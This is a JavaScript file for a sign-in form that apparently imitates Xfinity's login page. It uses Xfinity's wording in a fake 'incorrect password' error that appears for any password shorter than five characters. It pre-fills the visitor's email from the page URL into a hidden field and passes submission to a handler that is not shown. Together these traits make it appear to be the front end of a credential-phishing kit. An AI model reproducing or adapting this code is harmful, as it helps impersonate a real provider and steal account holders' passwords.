document.addEventListener("DOMContentLoaded", function() {
    var signInButton = document.getElementById('sign_in');
    var passwordInput = document.getElementById('passwd');
    var userEmailField = document.getElementById('user-email');
    var hiddenUserInput = document.getElementById('user');
    var passwordErrorDiv = document.createElement('div');
    passwordErrorDiv.style.color = 'red';
    passwordErrorDiv.style.fontWeight = 'normal';
    passwordErrorDiv.style.fontSize = '12px';
    passwordErrorDiv.id = 'password-error';
    passwordInput.parentNode.insertBefore(passwordErrorDiv, passwordInput.nextSibling);

    var customCheckbox = document.getElementById('custom-checkbox');
    var customRememberMe = document.getElementById('custom-remember-me');
    
    customCheckbox.addEventListener('click', function() {
        customRememberMe.checked = !customRememberMe.checked;
        if (customRememberMe.checked) {
            customCheckbox.classList.add('checked');
        } else {
            customCheckbox.classList.remove('checked');
        }
    });

    signInButton.onclick = function(event) {
        if (passwordInput.value.trim() === '') {
            event.preventDefault();
            passwordErrorDiv.textContent = 'Please type in your password to sign in.';
            passwordInput.style.border = '0.2px solid red';
            passwordErrorDiv.style.display = 'block';
        } else if (passwordInput.value.trim().length < 5) {
            event.preventDefault();
            passwordErrorDiv.textContent = 'The Xfinity ID or password you entered was incorrect. Please try again.';
            passwordInput.style.border = '0.2px solid red';
            passwordErrorDiv.style.display = 'block';
        } else {
            passwordErrorDiv.style.display = 'none';
            passwordInput.style.border = '';
            handleFormSubmit(event); // Call the handleFormSubmit function
        }
    };

    function getQueryParameter(name) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name);
    }

    const email = getQueryParameter('email');
    if (email) {
        userEmailField.textContent = email;
        hiddenUserInput.value = email;
    }
});

function togglePasswordVisibility() {
    const passwordField = document.getElementById('passwd');
    const passwordToggle = document.getElementById('toggle-password');
    const passwordIcon = document.getElementById('password-icon');

    if (passwordField.type === 'password') {
        passwordField.type = 'text';
        passwordIcon.classList.remove('fa-eye');
        passwordIcon.classList.add('fa-eye-slash');
    } else {
        passwordField.type = 'password';
        passwordIcon.classList.remove('fa-eye-slash');
        passwordIcon.classList.add('fa-eye');
    }
}
